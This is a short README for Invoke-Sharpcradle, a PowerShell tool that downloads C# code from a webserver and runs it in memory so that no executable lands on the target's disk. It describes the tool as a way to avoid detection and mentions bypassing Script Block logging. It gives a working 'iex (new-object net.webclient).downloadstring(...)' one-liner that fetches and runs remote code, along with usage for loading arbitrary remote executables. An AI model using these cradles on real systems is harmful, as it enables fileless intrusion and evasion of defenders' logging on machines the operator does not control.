# Invoke-Sharpcradle
Load C# Code from a Webserver straight to memory and execute it there.

All I did here was to take the C# code from https://github.com/anthemtotheego/SharpCradle and convert it into a Powershell script using Add-Type. 

Why? No executable on the target system hard disk. Powershell in memory, C# code in memory. To bypass Script Block logging further precautions have to be taken.

`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')`

`Invoke-Sharpcradle -Uri WebserverURI -Arguments ExecutableArguments`

![alt text](https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.png)
